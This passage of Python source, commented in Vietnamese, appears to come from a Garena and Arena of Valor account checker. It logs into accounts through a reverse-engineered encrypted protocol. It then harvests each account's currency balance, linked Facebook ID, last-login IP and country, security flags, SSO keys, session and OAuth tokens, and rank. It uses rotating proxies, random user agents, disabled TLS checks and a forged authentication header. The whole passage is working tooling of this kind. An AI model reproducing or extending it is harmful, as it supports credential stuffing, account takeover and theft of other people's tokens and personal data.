        parsed = _parse_login_resp(resp)
        if parsed.get("access_token") or parsed.get("session_key"):
            return parsed
        if parsed.get("error_code") or parsed.get("error"):
            return parsed
        return {'error': f'http_status={resp.status_code}'}
    except Exception as exc:
        return last_err if last_err.get('error') else {'error': str(exc)}

def _build_login(account: str, password: str, salt: str, verify_code: str):
    xtea_key, pw_hash = _derive_login_key(password, salt, verify_code)
    user_status_bytes = _pf_varint(2, 4608)    # UserStatus { status=USER_STATUS_MOBILE_ACTIVE }
    # device_id on dinh theo account (xem _begin_check_context)
    device_id = _ctx_device_id()
    inner = (
        _pf_bytes(1, pw_hash)                +  # password_hash (MD5hex as ASCII bytes)
        _pf_varint(2, 0)                     +  # login_mode = LOGIN_NORMAL
        _pf_bytes(3, user_status_bytes)      +  # user_status sub-message
        _pf_bytes(4, device_id)                 # device_id
    )
    enc  = xtea_encrypt(inner, xtea_key)
    body = _pf_bytes(1, enc)                    # LoginRequest.data
    return body, xtea_key

# ── Session-encrypted framing (post-login) ────────────────────────────────────
def _build_enc_frame(cmd: int, body: bytes, session_key: bytes) -> bytes:
    """Build a frame and encrypt payload with session_key (XTEA-CBC)."""
    hdr = (
        _pf_varint(1, PACKET_VERSION)   +
        _pf_varint(2, _next_id())       +
        _pf_varint(3, CMD_C2S_REQUEST)  +
        _pf_varint(4, cmd)              +
        _pf_varint(6, int(time.time()))
    )
    payload = struct.pack('>H', len(hdr)) + hdr + body
    enc_payload = xtea_encrypt(payload, session_key)
    return struct.pack('<I', len(enc_payload)) + enc_payload

def _recv_enc_frame(sock, session_key: bytes, timeout: float = None) -> tuple:
    """Receive and decrypt a session-encrypted frame."""
    size = struct.unpack('<I', _recvall(sock, 4, timeout))[0]
    enc_payload = _recvall(sock, size, timeout)
    payload = xtea_decrypt(enc_payload, session_key)
    hdr_len = struct.unpack('>H', payload[:2])[0]
    raw_hdr = _proto_decode(payload[2:2+hdr_len])
    hdr = {k: (_proto_get(raw_hdr, k) if isinstance(v, list) else v)
           for k, v in raw_hdr.items()}
    body = payload[2+hdr_len:]
    return hdr, body

def _send_cmd(sock, cmd: int, body: bytes, session_key: bytes, max_tries: int = 5,
              timeout: float = None) -> tuple:
    """Send an encrypted command, skip spontaneous pushes, return matching response.

    Optional per-call timeout restores previous sock timeout afterward so a
    single slow/missing reply cannot burn the whole post-login budget.
    """
    old_to = None
    if timeout is not None:
        try:
            old_to = sock.gettimeout()
            sock.settimeout(float(timeout))
        except Exception:
            old_to = None
    try:
        sock.sendall(_build_enc_frame(cmd, body, session_key))
        for _ in range(max_tries):
            hdr, resp_body = _recv_enc_frame(sock, session_key, timeout)
            resp_cmd = hdr.get(4, 0)
            if resp_cmd == cmd:
                return hdr, resp_body
            # Spontaneous push — skip and read next
        return {5: -1}, b''  # give up
    finally:
        if timeout is not None and old_to is not None:
            try:
                sock.settimeout(old_to)
            except Exception:
                pass

# ── Post-login info fetchers ──────────────────────────────────────────────────
def _fetch_login_info(sock, session_key: bytes) -> dict:
    """CMD 276: region, shells, timestamps, FB UID, last-login IP."""
    try:
        hdr, body = _send_cmd(sock, CMD_LOGIN_INFO_GET, b'', session_key, timeout=_TCP_CMD_TIMEOUT)
        if hdr.get(5, 0) != 0:
            return {}
        fields = _proto_decode(body)
        info = {}
        region_raw = _proto_get(fields, 14)
        if region_raw is not None:
            info['region'] = region_raw.decode('utf-8') if isinstance(region_raw, bytes) else str(region_raw)
        ccu = _proto_get(fields, 15)
        if ccu is not None:
            info['ccu'] = ccu
        # field[13]: shells balance (primary; field[1] value unverified — same for multiple accounts)
        acc_raw = _proto_get(fields, 13)
        if isinstance(acc_raw, bytes):
            acc = _proto_decode(acc_raw)
            shells = _proto_get(acc, 1)
            if shells is not None: info['shells'] = shells
            topup = _proto_get(acc, 2)
            if topup is not None: info['topup_time'] = topup
        # Timestamps — field[4]=account creation, field[5]=last login, field[2]=session expiry
        ct = _proto_get(fields, 4)
        if ct is not None: info['created_time'] = ct
        ll = _proto_get(fields, 5)
        if ll is not None: info['last_login'] = ll
        se = _proto_get(fields, 2)
        if se is not None: info['session_expiry'] = se
        # field[17]: Facebook UID + link timestamp
        fb_raw = _proto_get(fields, 17)
        if isinstance(fb_raw, bytes):
            fb_proto = _proto_decode(fb_raw)
            # tag1 thường là FB user id (string/int); quét thêm tag khác nếu shape đổi
            for tag in (1, 2, 3, 4, 5):
                fb_uid_raw = _proto_get(fb_proto, tag)
                uid_s = _normalize_fb_uid(fb_uid_raw)
                if uid_s:
                    # tag2 đôi khi là timestamp — bỏ qua nếu giống unix ts
                    if tag == 2 and uid_s.isdigit() and 1_000_000_000 <= int(uid_s) <= 2_000_000_000:
                        info['fb_link_time'] = int(uid_s)
                        continue
                    info['fb_uid_login'] = uid_s
                    break
            fb_lt = _proto_get(fb_proto, 2)
            if fb_lt is not None and 'fb_link_time' not in info:
                try:
                    info['fb_link_time'] = int(fb_lt)
                except Exception:
                    pass
        elif fb_raw is not None:
            uid_s = _normalize_fb_uid(fb_raw)
            if uid_s:
                info['fb_uid_login'] = uid_s
        # field[18]: last session info {1: unknown, 2: last_session_time, 3: {ip, country}}
        s18_raw = _proto_get(fields, 18)
        if isinstance(s18_raw, bytes):
            s18 = _proto_decode(s18_raw)
            lst = _proto_get(s18, 2)
            if lst is not None: info['last_session_time'] = lst
            ip_raw_msg = _proto_get(s18, 3)
            if isinstance(ip_raw_msg, bytes):
                ip_proto = _proto_decode(ip_raw_msg)
                ip_raw = _proto_get(ip_proto, 2)
                if ip_raw is not None:
                    info['last_session_ip'] = ip_raw.decode('utf-8') if isinstance(ip_raw, bytes) else str(ip_raw)
                cc_raw = _proto_get(ip_proto, 3)
                if cc_raw is not None:
                    info['last_session_country'] = cc_raw.decode('utf-8') if isinstance(cc_raw, bytes) else str(cc_raw)
        return info
    except Exception:
        return {}

def _fetch_user_basic(sock, uid: int, session_key: bytes) -> dict:
    """CMD 289: username, nickname, avatar_id."""
    try:
        user_entry = _pf_varint(1, 0) + _pf_varint(2, uid)  # version=0, uid
        body = _pf_bytes(1, user_entry)
        hdr, resp = _send_cmd(sock, CMD_USER_BASIC_INFO_LIST_GET, body, session_key,
                              timeout=_TCP_CMD_TIMEOUT)
        if hdr.get(5, 0) != 0:
            return {}
        fields = _proto_decode(resp)
        user_entries = _proto_get_all(fields, 1)
        if not user_entries:
            return {}
        first = user_entries[0]
        user_data = _proto_decode(first) if isinstance(first, bytes) else {}
        info = {}
        # tag1=version, tag2=uid, tag3=username, tag4=nickname, tag5=avatar_data
        uid_v = _proto_get(user_data, 2)
        if uid_v is not None:
            info['uid'] = uid_v
        un = _proto_get(user_data, 3)
        if un is not None:
            info['username'] = un.decode('utf-8') if isinstance(un, bytes) else str(un)
        nn = _proto_get(user_data, 4)
        if nn is not None:
            info['nickname'] = nn.decode('utf-8') if isinstance(nn, bytes) else str(nn)
        av = _proto_get(user_data, 5)
        if isinstance(av, bytes) and av:
            info['avatar_raw_len'] = len(av)
        return info
    except Exception:
        return {}


def _fetch_user_full(sock, uid: int, session_key: bytes) -> dict:
    """
    CMD 291 USER_FULL_INFO_LIST_GET — richer profile than 289 when server supports it.

    Live probe (2026-07): GXX returns result=2 (empty) for same body as 289, or
    times out on other layouts. Kept as best-effort short-timeout call.
    """
    try:
        user_entry = _pf_varint(1, 0) + _pf_varint(2, uid)
        body = _pf_bytes(1, user_entry)
        hdr, resp = _send_cmd(
            sock, CMD_USER_FULL_INFO_LIST_GET, body, session_key,
            timeout=2, max_tries=1,
        )
        result_code = hdr.get(5, 0)
        info = {"_cmd": 291, "_result": result_code}
        if result_code != 0 or not resp:
            return info
        fields = _proto_decode(resp)
        entries = _proto_get_all(fields, 1)
        if not entries:
            # flat fields fallback
            info["raw_tags"] = sorted(fields.keys())
            return info
        first = entries[0]
        user_data = _proto_decode(first) if isinstance(first, bytes) else {}
        un = _proto_get(user_data, 3)
        if un is not None:
            info["username"] = un.decode("utf-8") if isinstance(un, bytes) else str(un)
        nn = _proto_get(user_data, 4)
        if nn is not None:
            info["nickname"] = nn.decode("utf-8") if isinstance(nn, bytes) else str(nn)
        # Capture extra tags beyond basic 289 (5+)
        extra = {}
        for tag, val in user_data.items():
            if tag in (1, 2, 3, 4):
                continue
            if isinstance(val, bytes):
                try:
                    s = val.decode("utf-8")
                    if s.isprintable() and len(s) < 120:
                        extra[str(tag)] = s
                        continue
                except Exception:
                    pass
                extra[str(tag)] = f"bytes:{len(val)}"
            else:
                extra[str(tag)] = val
        if extra:
            info["extra"] = extra
        info["_ok"] = True
        return info
    except Exception as exc:
        return {"_cmd": 291, "_error": type(exc).__name__}


def _fetch_gpp_info(sock, session_key: bytes, app_id: int = None) -> dict:
    """
    CMD 337 USER_GPP_INFO_LIST_GET — per-app GPP / game profile payload.

    Live probe: body=app_id(100054) → result=0 but only echoes {app_id}.
    Other bodies timeout/result=2. Best-effort; non-blocking.
    """
    app_id = int(app_id or LIEN_QUAN_APP_ID)
    try:
        body = _pf_varint(1, app_id)
        hdr, resp = _send_cmd(
            sock, CMD_USER_GPP_INFO_LIST_GET, body, session_key,
            timeout=2, max_tries=1,
        )
        result_code = hdr.get(5, 0)
        info = {"_cmd": 337, "_result": result_code, "app_id": app_id}
        if result_code != 0 or not resp:
            return info
        fields = _proto_decode(resp)
        # nested message on tag1
        raw = _proto_get(fields, 1)
        if isinstance(raw, bytes):
            nested = _proto_decode(raw)
            # pure echo of app_id only → not useful
            if list(nested.keys()) == [1] and nested.get(1) == app_id:
                info["echo_only"] = True
                return info
            info["fields"] = {
                str(k): (v.decode("utf-8", errors="replace") if isinstance(v, bytes) and len(v) < 80 else
                         (f"bytes:{len(v)}" if isinstance(v, bytes) else v))
                for k, v in nested.items()
            }
            info["_ok"] = True
        else:
            info["raw_tags"] = sorted(fields.keys())
            if fields:
                info["_ok"] = True
        return info
    except Exception as exc:
        return {"_cmd": 337, "_error": type(exc).__name__, "app_id": app_id}


def _fetch_account_info(sock, session_key: bytes) -> dict:
    """CMD 342: password_secured, email_verified, account_secured, mobile_bound.
    Java protobuf: tag4=password_secured, tag5=email_verified, tag6=account_secured, tag7=mobile_bound.
    Note: many GXX nodes never reply to 342 → short timeout, never block SSO path.
    """
    try:
        hdr, body = _send_cmd(sock, CMD_USER_ACCOUNT_INFO_GET, b'', session_key,
                              timeout=min(4, _TCP_CMD_TIMEOUT), max_tries=2)
        if hdr.get(5, 0) != 0:
            return {}
        fields = _proto_decode(body)
        info = {}
        v = _proto_get(fields, 4)
        if v is not None: info['password_set'] = bool(v)
        v = _proto_get(fields, 5)
        if v is not None: info['email_verified'] = bool(v)
        v = _proto_get(fields, 6)
        if v is not None: info['account_secured'] = bool(v)
        v = _proto_get(fields, 7)
        if v is not None: info['mobile_bound'] = bool(v)
        return info
    except Exception:
        return {}

def _fetch_sso_key(sock, session_key: bytes) -> dict:
    """CMD 442: SSO key for HTTP APIs (also works as account/init session_key)."""
    try:
        hdr, body = _send_cmd(sock, CMD_SSO_KEY_GET, b'', session_key, timeout=_TCP_CMD_TIMEOUT)
        if hdr.get(5, 0) != 0:
            return {}
        fields = _proto_decode(body)
        info = {}
        sso = _proto_get(fields, 1)
        if sso is not None:
            info['sso_key'] = sso.decode('utf-8') if isinstance(sso, bytes) else str(sso)
        exp = _proto_get(fields, 2)
        if exp is not None:
            info['expiry'] = exp
        return info
    except Exception:
        return {}


def _fetch_sso_key_with_retry(sock, session_key: bytes, retries: int = None) -> dict:
    """Retry CMD 442 — sso_key flaky under load / proxy jitter."""
    attempts = _SSO_KEY_RETRIES if retries is None else max(0, int(retries))
    for attempt in range(attempts + 1):
        info = _fetch_sso_key(sock, session_key)
        if (info.get("sso_key") or "").strip():
            return info
        if attempt < attempts:
            time.sleep(0.2 * (attempt + 1))
    return {}


def _fetch_session_token(sock, session_key: bytes, app_id: int = 0) -> dict:
    """CMD 278: HTTP session token — usable as account/init?session_key=..."""
    try:
        body = b'' if not app_id else _pf_varint(1, int(app_id))
        hdr, resp = _send_cmd(sock, CMD_SESSION_TOKEN_GET, body, session_key, timeout=_TCP_CMD_TIMEOUT)
        if hdr.get(5, 0) != 0:
            return {}
        fields = _proto_decode(resp)
        info = {}
        tok = _proto_get(fields, 1)
        if tok is not None:
            info['session_token'] = tok.decode('utf-8') if isinstance(tok, bytes) else str(tok)
        exp = _proto_get(fields, 2)
        if exp is not None:
            info['expiry'] = exp
        return info
    except Exception:
        return {}


def _fetch_recent_games(session_token: str, proxy=None) -> list:
    """
    GameApp recent titles:
      GET garenaapp.garenanow.com/api/user/get_recent_games?session_key=<CMD278>
    """
    if not HAS_REQUESTS or not session_token:
        return []
    try:
        resp = _requests.get(
            "https://garenaapp.garenanow.com/api/user/get_recent_games",
            params={"session_key": session_token},
            verify=False,
            timeout=6,
            proxies=_get_http_proxies(proxy),
        )
        if resp.status_code != 200:
            return []
        data = resp.json()
        if not isinstance(data, dict) or data.get("error"):
            return []
        games = data.get("games") or []
        out = []
        for g in games[:12]:
            if not isinstance(g, dict):
                continue
            out.append({
                "name": g.get("name") or "",
                "game_id": g.get("game_id"),
                "last_use_time": g.get("last_use_time") or 0,
            })
        return out
    except Exception:
        return []


def _normalize_fb_uid(v) -> str:
    """
    Chuẩn hoá Facebook user id (số / string) từ mọi nguồn Garena.
    Bỏ giá trị rỗng, 0, null, và timestamp giả.
    """
    if v is None or v is False:
        return ""
    if isinstance(v, bytes):
        try:
            v = v.decode("utf-8", errors="ignore")
        except Exception:
            v = str(v)
    if isinstance(v, (int, float)):
        try:
            iv = int(v)
        except Exception:
            return ""
        if iv <= 0:
            return ""
        # unix ts (2001–2033) không phải FB uid hợp lệ cho hiển thị link
        if 1_000_000_000 <= iv <= 2_100_000_000:
            return ""
        return str(iv)
    s = str(v).strip()
    if not s or s.lower() in {"0", "null", "none", "undefined", "false", "n/a", "-"}:
        return ""
    # dict lồng: {"fb_uid": "..."} / {"id": "..."}
    if s.startswith("{") and "fb" in s.lower():
        try:
            import ast
            # không parse JSON lỏng — chỉ lấy digits dài
            m = re.search(r"(?:fb_uid|facebook_id|fb_id|user_id|uid|id)[\"']?\s*[:=]\s*[\"']?(\d{5,})", s, re.I)
            if m:
                return m.group(1)
        except Exception:
            pass
    # chỉ giữ chuỗi số FB (thường ≥ 5 chữ số) hoặc app-scoped id
    if re.fullmatch(r"\d{5,}", s):
        return s
    # một số payload có prefix "fb:" / "facebook:"
    m = re.search(r"(?:fb|facebook)[:\s=_-]*(\d{5,})", s, re.I)
    if m:
        return m.group(1)
    m2 = re.search(r"\b(\d{8,})\b", s)
    if m2:
        return m2.group(1)
    return ""


def _extract_fb_uid_from_obj(obj, depth: int = 0) -> str:
    """Quét dict/list tìm Facebook uid."""
    if depth > 4 or obj is None:
        return ""
    if isinstance(obj, (str, int, float, bytes)):
        return _normalize_fb_uid(obj)
    if isinstance(obj, dict):
        for k in (
            "fb_uid", "fbUid", "facebook_id", "facebookId", "facebook_uid",
            "fb_id", "fbId", "user_id", "userId", "uid", "id", "open_id", "openid",
        ):
            if k in obj:
                u = _normalize_fb_uid(obj.get(k))
                if u:
                    return u
        for k, v in obj.items():
            lk = str(k).lower()
            if any(x in lk for x in ("fb", "facebook")) and not any(
                x in lk for x in ("time", "date", "link_time", "icon", "url", "avatar", "name", "username")
            ):
                u = _normalize_fb_uid(v) if not isinstance(v, (dict, list)) else _extract_fb_uid_from_obj(v, depth + 1)
                if u:
                    return u
        for v in obj.values():
            if isinstance(v, (dict, list)):
                u = _extract_fb_uid_from_obj(v, depth + 1)
                if u:
                    return u
    if isinstance(obj, (list, tuple)):
        for it in obj[:20]:
            u = _extract_fb_uid_from_obj(it, depth + 1)
            if u:
                return u
    return ""


def _finalize_fb_fields(result: dict) -> None:
    """Gộp fb_uid từ mọi nguồn → result['fb_uid'] (string) + fb_linked."""
    if not isinstance(result, dict):
        return
    candidates = [
        result.get("fb_uid"),
        result.get("fb_uid_login"),
        result.get("fb_uid_from_init"),
        result.get("facebook_id"),
        result.get("fb_id"),
    ]
    # nested objects
    for key in ("fb_account", "fb_account_name", "_acct_sec", "user_info"):
        v = result.get(key)
        if isinstance(v, dict):
            candidates.append(_extract_fb_uid_from_obj(v))
        elif isinstance(v, str) and v.isdigit():
            candidates.append(v)
    uid = ""
    for c in candidates:
        uid = _normalize_fb_uid(c)
        if uid:
            break
    if uid:
        result["fb_uid"] = uid
        result["fb_linked"] = True
    elif result.get("fb_linked") or result.get("fb_account_name"):
        result["fb_linked"] = True


def _fetch_fb_info(sock, session_key: bytes) -> dict:
    """CMD 467: Facebook linked + UUID (fb_uid) nếu có."""
    try:
        body = _pf_str(1, "")
        hdr, resp = _send_cmd(sock, CMD_FB_USER_INFO_GET, body, session_key, timeout=_TCP_CMD_TIMEOUT)
        if hdr.get(5, 0) != 0:
            return {'fb_linked': False}
        fields = _proto_decode(resp)
        out = {'fb_linked': False}
        # top-level tags đôi khi chứa uid thẳng
        for tag in (1, 2, 3, 4, 5, 6):
            raw = _proto_get(fields, tag)
            if raw is None:
                continue
            if isinstance(raw, bytes) and len(raw) > 2:
                # nested protobuf message
                try:
                    nested = _proto_decode(raw)
                    for ntag in (1, 2, 3, 4, 5):
                        uid = _normalize_fb_uid(_proto_get(nested, ntag))
                        if uid:
                            out['fb_linked'] = True
                            out['fb_uid'] = uid
                            return out
                    # nested non-empty ⇒ linked nhưng chưa parse được uid
                    if nested and not out.get('fb_uid'):
                        out['fb_linked'] = True
                        # brute: mọi leaf
                        for nv in nested.values():
                            if isinstance(nv, list):
                                for item in nv:
                                    uid = _normalize_fb_uid(item)
                                    if uid:
                                        out['fb_uid'] = uid
                                        return out
                            else:
                                uid = _normalize_fb_uid(nv)
                                if uid:
                                    out['fb_uid'] = uid
                                    return out
                except Exception:
                    uid = _normalize_fb_uid(raw)
                    if uid:
                        out['fb_linked'] = True
                        out['fb_uid'] = uid
                        return out
            else:
                uid = _normalize_fb_uid(raw)
                if uid:
                    out['fb_linked'] = True
                    out['fb_uid'] = uid
                    return out
        return out
    except Exception:
        return {'fb_linked': False}

def _fetch_oauth_token(sock, session_key: bytes, app_id: int, response_type: int = 2) -> dict:
    """CMD 439: get OAuth token for a specific app. response_type: 1=CODE, 2=TOKEN."""
    try:
        body = (
            _pf_varint(1, app_id) +
            _pf_str(2, "") +
            _pf_varint(3, response_type) +
            _pf_str(4, "") +
            _pf_varint(5, 0) +
            _pf_varint(6, CLIENT_PLATFORM_ANDROID)
        )
        hdr, resp = _send_cmd(sock, CMD_APP_OAUTH_LOGIN, body, session_key, timeout=_TCP_CMD_TIMEOUT)
        if hdr.get(5, 0) != 0:
            return {}
        fields = _proto_decode(resp)
        info = {}
        tok = _proto_get(fields, 1)
        if tok is not None:
            info['access_token'] = tok.decode('utf-8') if isinstance(tok, bytes) else str(tok)
        oid = _proto_get(fields, 4)
        if oid is not None:
            info['open_id'] = oid.decode('utf-8') if isinstance(oid, bytes) else str(oid)
        return info
    except Exception:
        return {}


# ── AOV Camp (kg-camp / kgvn-api) rank: roleJobName + rankGradeStar ──────────
# Screenshot reverse: getselfuserinfo → data.role.userGameInfo
#   roleJobName="T.Anh V", rankGradeStar=2, roleJob="22",
#   roleJobIcon=https://kg-camp.mobagarena.com/aov/grade_level_icon/22.png
# Auth chuẩn: MSDK itopencodeparam từ game WebView. Checker thử access_token AoV.
_KGCAMP_API_HOSTS = (
    "https://kgvn-api.mobagarena.com",
    "https://kg-api.mobagarena.com",
)
_KGCAMP_ORIGINS = (
    "https://kgvn-camp.mobagarena.com",
    "https://kg-camp.mobagarena.com",
)
# roleJob / gradeLevel id → tên rank (đồng bộ weeklyreport rank_config — authoritative;
# 22 = T.Anh V, 27 = Cao Thủ, 28 = Chiến Tướng đã xác nhận từ dữ liệu thật)
_AOV_ROLEJOB_NAME = {
    1: "Chưa có",
    2: "Đồng III", 3: "Đồng II", 4: "Đồng I",
    5: "Bạc III", 6: "Bạc II", 7: "Bạc I",
    8: "Vàng IV", 9: "Vàng III", 10: "Vàng II", 11: "Vàng I",
    12: "B.Kim V", 13: "B.Kim IV", 14: "B.Kim III", 15: "B.Kim II", 16: "B.Kim I",
    17: "K.Cương V", 18: "K.Cương IV", 19: "K.Cương III", 20: "K.Cương II", 21: "K.Cương I",
    22: "T.Anh V", 23: "T.Anh IV", 24: "T.Anh III", 25: "T.Anh II", 26: "T.Anh I",
    27: "Cao Thủ", 28: "Chiến Tướng", 29: "Chiến Thần", 30: "Thách Đấu",
    31: "Chiến Thần", 32: "Thách Đấu",
}


def _parse_kgcamp_rank_payload(data) -> dict:
    """
    Parse response getselfuserinfo / login / cardinfo → rank fields.
    Shape (captured):
      {code:0, data:{role:{userGameInfo:{roleJob, roleJobName, rankGradeStar, roleJobIcon}, characterName, ...}}}
    hoặc top-level role (không bọc data).
    """
    if not isinstance(data, dict):
        return {}
    # unwrap code/data
    root = data
    if isinstance(data.get("data"), dict):
        root = data.get("data") or data
    role = root.get("role") if isinstance(root.get("role"), dict) else root
    if not isinstance(role, dict):
        return {}

    ugi = role.get("userGameInfo") or role.get("user_game_info") or {}
    if not isinstance(ugi, dict):
        ugi = {}

    # nested alternate locations
    if not ugi:
        for k in ("gameInfo", "game_info", "rankInfo", "rank_info"):
            if isinstance(role.get(k), dict):
                ugi = role.get(k)
                break

    out = {}
    name = (
        ugi.get("roleJobName")
        or ugi.get("role_job_name")
        or ugi.get("rankName")
        or ugi.get("rank_name")
        or ""
    )
    name = str(name).strip() if name else ""

    # roleJobName đôi khi là chuỗi mã hoá (vd "56B5D52446E4803C_##") — ưu tiên map job id
    if name and re.fullmatch(r"[0-9A-Fa-f]{6,}_?#*", name) is not None:
        name = ""

    job_raw = ugi.get("roleJob") if ugi.get("roleJob") is not None else ugi.get("role_job")
    try:
        job_id = int(job_raw) if job_raw is not None and str(job_raw).strip() != "" else 0
    except Exception:
        job_id = 0

    stars = 0
    for sk in ("rankGradeStar", "rank_grade_star", "rankStar", "rank_star", "star", "stars", "gradeStar"):
        if ugi.get(sk) is None and role.get(sk) is None:
            continue
        try:
            stars = int(ugi.get(sk) if ugi.get(sk) is not None else role.get(sk))
            if stars < 0:
                stars = 0
            break
        except Exception:
            continue

    icon = (
        ugi.get("roleJobIcon")
        or ugi.get("role_job_icon")
        or ""
    )
    # suy ra job id từ icon URL .../grade_level_icon/22.png
    if not job_id and icon:
        m = re.search(r"grade_level_icon/(\d+)\.(?:png|jpg|webp)", str(icon), re.I)
        if m:
            try:
                job_id = int(m.group(1))
            except Exception:
                pass

    if not name and job_id:
        name = _AOV_ROLEJOB_NAME.get(job_id, "")

    char_name = (
        role.get("characterName")
        or role.get("character_name")
        or role.get("roleName")
        or ugi.get("roleName")
        or ""
    )
    if isinstance(char_name, str):
        char_name = char_name.strip()

    if name or stars or job_id:
        out["rank"] = name
        out["rank_stars"] = stars if stars > 0 else 0
        out["role_job"] = job_id
        out["role_job_icon"] = str(icon or "")
        if char_name:
            out["name"] = char_name
        out["_source"] = "kgcamp"
        out["_raw_ugi"] = ugi
    _cr = _pick_credit_score(ugi, role, root, data)
    if _cr is not None:
        out["credit"] = _cr
        out["_credit_source"] = "kgcamp"
    return out


def _parse_kgcamp_season(data) -> dict:
    """
    Parse season/detail (rank mùa) → gradeLevel, gradeStar, winRate, battles, mvp, top heroes.
    Shape: {code:0, data:{gradeLevel, gradeLevelName(obfuscated), gradeLevelIcon,
                          gradeStar, totalBattleNum, winBattleNum, winRate, mvpBattleNum,
                          commonHero:[{heroId, heroName(obf), heroCover, winRate, maxKda,
                                       maxKdaKills, maxKdaDeaths, maxKdaAssists, sort,
                                       winBattleNum, battleNum}], useHeroNum}}
    """
    if not isinstance(data, dict):
        return {}
    root = data.get("data") if isinstance(data.get("data"), dict) else data
    if not isinstance(root, dict):
        return {}

    grade = root.get("gradeLevel")
    try:
        grade_id = int(grade) if grade is not None else 0
    except (TypeError, ValueError):
        grade_id = 0

    grade_name = (root.get("gradeLevelName") or "").strip()
    # tên rank đôi khi bị mã hoá ("45D81FA5309BDF03_##") → map theo gradeLevel
    if not grade_name or re.fullmatch(r"[0-9A-Fa-f]{6,}_?#*", grade_name) is not None:
        grade_name = _AOV_ROLEJOB_NAME.get(grade_id, "")

    def _i(v):
        try:
            return int(v)
        except (TypeError, ValueError):
            return 0

    heroes = []
    ch = root.get("commonHero")
    if isinstance(ch, list):
        for h in ch:
            if not isinstance(h, dict):
                continue
            heroes.append({
                "hero_id": h.get("heroId"),
                "hero_name": (h.get("heroName") or "").strip(),
                "hero_cover": h.get("heroCover") or "",
                "win_rate": h.get("winRate"),
                "kda": h.get("maxKda"),
                "kills": h.get("maxKdaKills"),
                "deaths": h.get("maxKdaDeaths"),
                "assists": h.get("maxKdaAssists"),
                "battles": h.get("battleNum"),
                "wins": h.get("winBattleNum"),
            })

    out = {}
    if grade_id or grade_name or root.get("gradeStar") is not None:
        out["season_rank"] = grade_name or ""
        out["season_rank_id"] = grade_id
        out["season_stars"] = _i(root.get("gradeStar"))
        out["season_winrate"] = root.get("winRate")
        out["season_battles"] = _i(root.get("totalBattleNum"))
        out["season_wins"] = _i(root.get("winBattleNum"))
        out["season_mvp"] = _i(root.get("mvpBattleNum"))
        out["season_heroes_count"] = _i(root.get("useHeroNum"))
        out["_source"] = "kgcamp_season"
    if heroes:
        out["top_heroes"] = heroes
    return out


def _parse_kgcamp_season_list(data) -> list:
    """Parse season/list → [{seasonId, seasonYear, seasonYearIndex, startTime, endTime}]."""
    if not isinstance(data, dict):
        return []
    root = data.get("data") if isinstance(data.get("data"), dict) else data
    lst = root.get("list") if isinstance(root, dict) else None
    if not isinstance(lst, list):
        return []
    out = []
    for s in lst:
        if not isinstance(s, dict):
            continue
        out.append({
            "season_id": s.get("seasonId"),
            "season_year": s.get("seasonYear"),
            "season_year_index": s.get("seasonYearIndex"),
            "start_time": s.get("startTime"),
            "end_time": s.get("endTime"),
        })
    return out


def _fetch_kgcamp_rank(access_token: str = "", open_id: str = "", proxy=None,
                       sso_key: str = "", uid: str = "") -> dict:
    """
    Gọi AOV Camp API (kgvn-api) lấy rank đúng như capture:
      roleJobName + rankGradeStar (vd T.Anh V + 2 sao).

    Flow đã reverse (đầy đủ, verified live):
      1. itop auth/login (openid=uid, token=aov_access_token) → itop_openid + token
      2. forge Msdk-Itopencodeparam = TEA-outer của
         "openid=<aov_open_id>&access_token=<itop_token>&gopenid=<itop_openid>"
      3. POST /api/user/game/getcredential (areaid=1, logicworldid=1011) → encryption + roleId
      4. EncodeParam = node(camp-security-oversea).getEncodeParam(roleId) sau setLoginRes
      5. POST /api/user/game/getselfuserinfo kèm header Encodeparam → rank.

    Fallback cũ (param thô) giữ lại nếu flow mới fail — không raise.
    """
    if not HAS_REQUESTS:
        return {}
    token_candidates = []
    for t in (access_token, sso_key):
        t = str(t or "").strip()
        if t and t not in token_candidates:
            token_candidates.append(t)
    oid = str(open_id or "").strip()
    uid_s = str(uid or "").strip()
    if not token_candidates and not oid:
        return {}

    ua = _random_android_browser_ua()
    host = _KGCAMP_API_HOSTS[0]
    origin = _KGCAMP_ORIGINS[0]

    try:
        sess = _requests.Session()
        sess.verify = False
        if proxy:
            sess.proxies = _get_http_proxies(proxy) or {}
    except Exception:
        return {}

    # ── Flow chuẩn: itop login → itopencodeparam → getcredential → EncodeParam → self info
    if token_candidates and oid and uid_s:
        try:
            parsed = _kgcamp_full_flow(sess, host, origin, uid_s, token_candidates[0],
                                       oid, ua, proxy)
            if parsed:
                parsed["_api"] = host + "/api/user/game/getselfuserinfo"
                return parsed
        except Exception:
            pass

    # ── Fallback cũ: param thô (không forge)
    channel_ids = ("3", "131")
    paths = (
        "/api/user/game/getselfuserinfo",
        "/api/user/login",
        "/api/user/home/game/selfcardinfo",
    )

    for token in (token_candidates or [""]):
        bodies = []
        if token and oid:
            bodies = [
                {},
                {"access_token": token, "openid": oid},
                {"token": token, "openid": oid, "gameid": "1137", "channelid": "3"},
            ]
        elif token:
            bodies = [{}, {"access_token": token}, {"token": token, "gameid": "1137"}]
        else:
            bodies = [{"openid": oid, "gameid": "1137"}]

        for ch in channel_ids:
            headers = {
                "User-Agent": ua,
                "Accept": "application/json, text/plain, */*",
                "Content-Type": "application/json",
                "Origin": origin,
                "Referer": origin + "/app",
                "Camp-Source": "AOV-CAMP",
                "Camp-Authtype": "msdk",
                "Aov-Region": "1137",
                "Aov-Language": "vi",
                "Msdk-Gameid": "1137",
                "Msdk-Channelid": ch,
                "Msdk-Os": "1",
                "areaid": "1011",
                "logicworldid": "1011",
            }
            if token:
                headers["Msdk-Itopencodeparam"] = token
                headers["Access-Token"] = token
            if oid:
                headers["Openid"] = oid
                headers["Msdk-Openid"] = oid

            for path in paths:
                for body in bodies:
                    try:
                        resp = sess.post(
                            host + path,
                            headers=headers,
                            json=body if body is not None else {},
                            verify=False,
                            timeout=8,
                        )
                    except Exception:
                        continue
                    if resp.status_code not in (200, 201):
                        continue
                    try:
                        data = resp.json()
                    except Exception:
                        continue
                    if not isinstance(data, dict):
                        continue
                    code = data.get("code")
                    if code not in (None, 0, "0", "OK", "ok", "success"):
                        if not (isinstance(data.get("data"), dict) or data.get("role")):
                            continue
                    parsed = _parse_kgcamp_rank_payload(data)
                    if parsed.get("rank") or parsed.get("rank_stars") or parsed.get("role_job"):
                        parsed["_api"] = host + path
                        return parsed
                    if path.endswith("/login") and (
                        data.get("encryption")
                        or (isinstance(data.get("data"), dict) and data["data"].get("encryption"))
                    ):
                        try:
                            resp2 = sess.post(
                                host + "/api/user/game/getselfuserinfo",
                                headers=headers,
                                json={},
                                verify=False,
                                timeout=8,
                            )
                            if resp2.status_code == 200:
                                parsed = _parse_kgcamp_rank_payload(resp2.json())
